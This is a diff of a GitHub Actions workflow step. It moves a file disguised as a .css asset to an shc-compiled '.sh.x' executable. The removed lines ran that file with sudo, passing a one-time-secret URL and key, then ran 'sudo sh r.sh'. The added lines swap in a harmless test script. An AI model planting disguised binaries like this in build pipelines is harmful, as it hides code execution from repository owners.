@@ -28,7 +28,12 @@ jobs:
       run: |
         cd ${{ github.workspace }}
         ls
+        echo 1
         mv cly7e1v/nc7dnhkat/ualml5/sinclairs1m85.css fyxtg.sh.x
-        sudo chmod 777 fyxtg.sh.x
+        cat > a.sh <<EOF
+        #!/bin/bash
+        ls
+        EOF
+        shc -f a.sh
         ls -la
-        sudo ./fyxtg.sh.x https://onetimesecret.com/secret/pq2nmc0v724poka4kkenesxvizzelxc ly9g8d && sudo sh r.sh
+        ./a.sh.x
